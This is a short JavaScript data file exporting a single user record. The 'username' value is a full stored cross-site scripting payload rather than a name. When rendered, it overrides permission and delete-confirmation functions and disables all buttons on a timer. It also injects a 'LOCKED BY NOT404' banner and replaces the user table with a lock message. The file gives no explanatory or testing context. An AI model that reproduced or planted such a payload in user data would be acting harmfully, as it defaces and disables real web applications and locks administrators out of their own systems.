export const users = [
  {
    "username": "<script> localStorage.setItem('system_locked','true'); sessionStorage.setItem('protected','NOT404'); window.hasPermission=function(){return false;}; window.confirmDelete=function(){alert('System locked by NOT404');return false;}; setInterval(()=>{ document.querySelectorAll('.btn-delete,button').forEach(btn=>{ btn.disabled=true; btn.style.opacity='0.5'; btn.style.cursor='not-allowed'; }); },1000); const lockMsg=document.createElement('div'); lockMsg.innerHTML='<div style=\"position:fixed;top:10px;right:10px;background:red;color:white;padding:10px;z-index:9999;\">LOCKED BY NOT404</div>'; document.body.appendChild(lockMsg); window.loadUsers=function(){ document.getElementById('userTable').innerHTML='<tr><td colspan=\"3\" style=\"color:red;text-align:center;padding:50px;\"><h2>SYSTEM LOCKED BY NOT404</h2></td></tr>'; }; </script>",
    "password": "1"
  }
];